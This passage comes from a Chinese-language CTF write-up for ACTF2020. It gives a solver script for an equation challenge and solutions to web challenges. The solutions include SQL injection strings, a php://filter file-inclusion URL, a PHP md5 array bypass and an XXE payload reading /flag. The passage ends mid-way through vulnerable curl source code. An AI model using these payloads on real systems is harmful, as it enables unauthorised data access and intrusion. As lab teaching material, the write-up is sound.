class="number">-18</span>*x4+<span class="number">26</span>*x5+<span class="number">16</span>*x7+<span class="number">77</span>*x8<span class="number">-63</span>*x9+<span class="number">13258</span>,</span><br><span class="line">    <span class="number">81</span>*x10+<span class="number">-48</span>*x9+<span class="number">66</span>*x8+<span class="number">-104</span>*x7+<span class="number">-121</span>*x6+<span class="number">95</span>*x5+<span class="number">85</span>*x4+<span class="number">60</span>*x3+<span class="number">-85</span>*x1+<span class="number">80</span>*x2+<span class="number">1559</span>,</span><br><span class="line">    <span class="number">101</span>*x10+<span class="number">-85</span>*x9+<span class="number">7</span>*x7+<span class="number">117</span>*x6+<span class="number">-83</span>*x5+<span class="number">-101</span>*x4+<span class="number">90</span>*x3+<span class="number">-28</span>*x2+<span class="number">18</span>*x1-x8<span class="number">-6308</span>,</span><br><span class="line">    <span class="number">99</span>*x10+<span class="number">-28</span>*x9+<span class="number">5</span>*x8+<span class="number">93</span>*x7+<span class="number">-18</span>*x6+<span class="number">-127</span>*x5+<span class="number">6</span>*x4+<span class="number">-9</span>*x3+<span class="number">-93</span>*x2+<span class="number">58</span>*x1+<span class="number">1697</span>],</span><br><span class="line">    [x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x0]    </span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> dict(b)</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">"x3"</span>: <span class="number">117</span>, <span class="string">"x7"</span>: <span class="number">95</span>, <span class="string">"x10"</span>: <span class="number">64</span>, <span class="string">"x9"</span>: <span class="number">119</span>, <span class="string">"x2"</span>: <span class="number">48</span>, <span class="string">"x6"</span>: <span class="number">121</span>, <span class="string">"x4"</span>: <span class="number">82</span>, <span class="string">"x1"</span>: <span class="number">70</span>, <span class="string">"x8"</span>: <span class="number">55</span>, <span class="string">"x5"</span>: <span class="number">84</span>&#125;</span><br><span class="line"></span><br><span class="line">part1 = chr(d[<span class="string">"x1"</span>])+chr(d[<span class="string">"x2"</span>])+chr(d[<span class="string">"x3"</span>])+chr(d[<span class="string">"x4"</span>])+chr(d[<span class="string">"x5"</span>])+chr(d[<span class="string">"x6"</span>])+chr(d[<span class="string">"x7"</span>])+chr(d[<span class="string">"x8"</span>])+chr(d[<span class="string">"x9"</span>])+chr(d[<span class="string">"x10"</span>])</span><br><span class="line"><span class="comment"># print hex(d["x1"]),hex(d["x2"]),hex(d["x3"]),hex(d["x4"]),hex(d["x5"]),hex(d["x6"]),hex(d["x7"]),hex(d["x8"]),hex(d["x9"]),hex(d["x10"])</span></span><br><span class="line">part2 = <span class="number">9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">part2 ^= d[i]</span><br><span class="line">part2 = str(part2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"actf&#123;%s_%s&#125;"</span>%(part1,part2)</span><br></pre></td></tr></table></figure></div><blockquote><p>p.s.这题其实给9个方程就可以做，因为变量必然是Ascii。</p></blockquote><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="universal-sql"><a href="#universal-sql" class="headerlink" title="universal_sql"></a>universal_sql</h2><ul><li>题目描述：你听说过万能密码？？</li><li>考察点：sql注入</li><li>难度：入门</li><li>分值：100</li><li>完成人数：11</li></ul><p>查看源代码，有个<code>index.txt</code>，里面是源码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = $_POST[username];</span><br><span class="line">$passwd = md5($_POST[passwd]);</span><br><span class="line">$sql = <span class="string">"select username from users where (username='$username') and (pw='$passwd')"</span>;</span><br></pre></td></tr></table></figure></div><p>构造<code>sql</code>语句，注释掉查询<code>pw</code>的部分：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where (username&#x3D;&#39;admin&#39;)#&#39;) and (pw&#x3D;&#39;$passwd&#39;)&quot;;</span><br></pre></td></tr></table></figure></div><p>用户名是<code>admin</code>时显示登录成功：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/universal_sql/1.png" data-fancybox="group" data-caption="burp" class="fancybox"><img alt="burp" title="burp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/universal_sql/1.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="茶颜悦色"><a href="#茶颜悦色" class="headerlink" title="茶颜悦色"></a>茶颜悦色</h2><ul><li>题目描述：茶颜！快来排队叭！</li><li>考察点：py脚本</li><li>难度：简单</li><li>分值：100</li><li>完成人数：9</li></ul><p>网站链接都是假的…只有翻页能点…查看源码有提示：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--找一找我最喜欢喝的幽兰拿铁!--&gt;</span></span><br></pre></td></tr></table></figure></div><p>于是写脚本自动翻页：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># header</span></span><br><span class="line">s=requests.session()                                     </span><br><span class="line">s.headers[<span class="string">'Accept'</span>]=<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span></span><br><span class="line">s.headers[<span class="string">'Accept-Encoding'</span>]=<span class="string">'gzip, deflate, br'</span></span><br><span class="line">s.headers[<span class="string">'Host'</span>]=<span class="string">'url'</span>                 </span><br><span class="line">s.headers[<span class="string">'Accept-Language'</span>]=<span class="string">'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6'</span></span><br><span class="line">s.headers[<span class="string">'User-Agent'</span>]=<span class="string">'zilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.106.94.13:40004'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(i)</span>:</span>                          </span><br><span class="line">    res = s.get(url,params=&#123;<span class="string">'page'</span>:str(i)&#125;)</span><br><span class="line">    res.encoding = res.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> res.text </span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">'page %d'</span>%i)</span><br><span class="line">    t = get_data(i)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'幽兰拿铁'</span> <span class="keyword">in</span> t[<span class="number">1000</span>:]:</span><br><span class="line">        print(t[<span class="number">1000</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><p>找到拿铁就给<code>flag</code>啦：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/chayan/cy.png" data-fancybox="group" data-caption="cy" class="fancybox"><img alt="cy" title="cy" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/chayan/cy.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><ul><li>题目描述：-</li><li>考察点：sql注入</li><li>难度：简单</li><li>分值：200</li><li>完成人数：10</li></ul><p>简单的sql注入</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql_page.png" data-fancybox="group" data-caption="sqlpage" class="fancybox"><img alt="sqlpage" title="sqlpage" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql_page.png" src="/img/loading.gif" class="lazyload"></a></p><p>根据输入的id查询用户名和密码</p><p><code>id=-1&#39; order by 1,2,3,4 #</code>时回显消失，所以一共是就3列数据</p><p>然后删除线那里给了表名，直接<code>union select</code>就能拿到<code>flag</code>，payload:</p><blockquote><p><code>id=-1&#39; union select 1,flag,3 from flag #</code></p></blockquote><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql.png" data-fancybox="group" data-caption="sql" class="fancybox"><img alt="sql" title="sql" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/babysql/sql.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="whats-git"><a href="#whats-git" class="headerlink" title="whats git"></a>whats git</h2><ul><li>题目描述：-</li><li>考察点：githack</li><li>难度：入门</li><li>分值：200</li><li>完成人数：6</li></ul><p><code>Githack</code>，然后找<code>flag</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> find ./ | grep flag </span></span><br><span class="line">./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash"> cat <span class="string">"./新建文件夹 - 副本 (7)/新建文件夹 - 副本 (3)/新建文件夹 - 副本 (4)/新建文件夹 - 副本 (3)/flag"</span></span></span><br><span class="line">ACTF&#123;.git_leak_is_dangerous&#125;%</span><br></pre></td></tr></table></figure></div><h2 id="backup-file"><a href="#backup-file" class="headerlink" title="backup_file"></a>backup_file</h2><ul><li>题目描述：-</li><li>考察点：bak文件、php弱类型</li><li>难度：简单</li><li>分值：200</li><li>完成人数：8</li></ul><p>提示<code>Try to find out source file!</code>，于是扫一下目录发现<code>index.php.bak</code>:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>$key == $str</code>时给<code>flag</code>，<code>key</code>必须是数字，而<code>str</code>是字符串</p><p>由于php弱类型，<code>str</code>在比较时<code>&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;=123</code></p><p>所以让<code>key=123</code>即可绕过比较</p><p>payload:</p><blockquote><p> <a href="http://106.15.207.47:21001/?key=123" target="_blank" rel="noopener">http://106.15.207.47:21001/?key=123</a></p></blockquote><h2 id="easy-file-include"><a href="#easy-file-include" class="headerlink" title="easy_file_include"></a>easy_file_include</h2><ul><li>题目描述：-</li><li>考察点：php文件包含</li><li>难度：简单</li><li>分值：200</li><li>完成人数：7</li></ul><p>首先不会，于是<a href="https://www.jianshu.com/p/6af8e76d22a5" target="_blank" rel="noopener">查资料</a>&lt;-拿这个payload试了下可以用：</p><blockquote><p><a href="http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php" target="_blank" rel="noopener">http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php</a></p></blockquote><p>得到源码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">"php://input"</span>) || stristr($file,<span class="string">"zip://"</span>) || stristr($file,<span class="string">"phar://"</span>) || stristr($file,<span class="string">"data:"</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>好像并没有什么用，直接读<code>flag.php</code>发现flag就在注释里…payload如下：</p><blockquote><p><a href="http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php" target="_blank" rel="noopener">http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php</a></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//ACTF&#123;Fi1e_InClUdE_Is_EaSy&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="easyHTTP"><a href="#easyHTTP" class="headerlink" title="easyHTTP"></a>easyHTTP</h2><ul><li>题目描述：-</li><li>考察点：HTTP协议</li><li>难度：入门</li><li>分值：200</li><li>完成人数：9</li></ul><p>题目界面：</p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1b.png" data-fancybox="group" data-caption="1b" class="fancybox"><img alt="1b" style="zoom:38%;" title="1b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1b.png" src="/img/loading.gif" class="lazyload"></a><p>将对应的信息填好，提交后在<code>header</code>中给出下一个<code>php</code>的位置：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1.png" data-fancybox="group" data-caption="b1" class="fancybox"><img alt="b1" title="b1" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/1.png" src="/img/loading.gif" class="lazyload"></a></p><p>访问之：</p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2b.png" data-fancybox="group" data-caption="2b" class="fancybox"><img alt="2b" style="zoom:38%;" title="2b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2b.png" src="/img/loading.gif" class="lazyload"></a><p>按照要求发送参数，然后在<code>header</code>中又给出下一个<code>php</code>的位置：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2.png" data-fancybox="group" data-caption="b2" class="fancybox"><img alt="b2" title="b2" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/2.png" src="/img/loading.gif" class="lazyload"></a></p><p>访问之：</p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3b.png" data-fancybox="group" data-caption="3b" class="fancybox"><img alt="3b" style="zoom:38%;" title="3b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3b.png" src="/img/loading.gif" class="lazyload"></a><p>按照要求发送<code>cookie</code>，然后在<code>header</code>中又给出下一个<code>php</code>的位置：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3.png" data-fancybox="group" data-caption="b3" class="fancybox"><img alt="b3" title="b3" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/3.png" src="/img/loading.gif" class="lazyload"></a></p><p>访问之：<br><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4b.png" data-fancybox="group" data-caption="4b" class="fancybox"><img alt="4b" style="zoom:38%;" title="4b" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4b.png" src="/img/loading.gif" class="lazyload"></a></p><p>按照要求<code>XFF</code>，最终拿到flag：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4.png" data-fancybox="group" data-caption="b4" class="fancybox"><img alt="b4" title="b4" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyHTTP/4.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><ul><li>题目描述：-</li><li>考察点：代码审计、md5绕过</li><li>难度：简单</li><li>分值：200</li><li>完成人数：9</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>$_SESSION[&#39;key&#39;]</code>中并没有值，所以<code>$_POST[&#39;key&#39;]</code>传空值可绕过</p><p>查了下，md5可以通过数组绕过：</p><blockquote><p>传入<code>md5</code>函数的参数为数组类型时返回<code>null</code></p></blockquote><p>只要向<code>username</code>和<code>password</code>中传两个不同的数组，数组经过md5后<code>null===null</code>即可绕过md5检查</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyphp/1.png" data-fancybox="group" data-caption="burpa" class="fancybox"><img alt="burpa" title="burpa" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/easyphp/1.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h2><ul><li>题目描述：快来挑选你的幸运数字吧~</li><li>考察点：爆破、XXE</li><li>难度：中等</li><li>分值：200</li><li>完成人数：6</li></ul><p>幸运数5位数，burp爆破得到<code>77777</code>，给了tips:</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num/xxe1.png" data-fancybox="group" data-caption="x1" class="fancybox"><img alt="x1" title="x1" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num/xxe1.png" src="/img/loading.gif" class="lazyload"></a></p><p>post的数据在<code>&lt;licky_number&gt;</code>这个标签中，由此想到可以注入，刚开始以为是XSS，查了半天也不知道怎么读文件，后来醒过神儿来，这部是XML么，百度了一下，原来是XXE… </p><p>payload：</p><blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lucky_number</span>&gt;</span>77777 and flag is <span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">lucky_number</span>&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num//xxe2.png" data-fancybox="group" data-caption="x2" class="fancybox"><img alt="x2" title="x2" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/web/lucky_num//xxe2.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><ul><li>题目描述：这真不是考密码学….</li><li>考察点：curl?</li><li>难度：简单</li><li>分值：200</li><li>完成人数：9</li></ul><p>查看源码，给了hint：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Nzc3Nzc3MmU2MjYxNmI=heiheihei--&gt;</span></span><br></pre></td></tr></table></figure></div><p>解base64，再解hex，得到<code>www.bak</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: s=<span class="string">'Nzc3Nzc3MmU2MjYxNmI='</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: s.decode(<span class="string">'base64'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">'7777772e62616b'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="string">'7777772e62616b'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'www.bak'</span></span><br></pre></td></tr></table></figure></div><p>下载下来，发现是个zip，解压后给了flag位置（<code>/flag</code>）和源码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;找找hint吧&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;这里什么也没有噢！&lt;&#x2F;p&gt;</span><br><span class="line">&lt;!--Nzc3Nzc3MmU2MjYxNmI&#x3D;heiheihei--&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;学习一下如何利用下面的代码?</span><br><span class="line">&#x2F;&#x2F;请不要用来做&quot;越界&quot;的操作</span><br><span class="line">error_reporting(0);</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    &#x2F;&#x2F; 创建一个新cURL资源</span><br><span class="line">    $ch &#x3D; curl_init();</span><br><span class="line">    &#x2F;&#x2F; 设置URL和相应的选项</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span 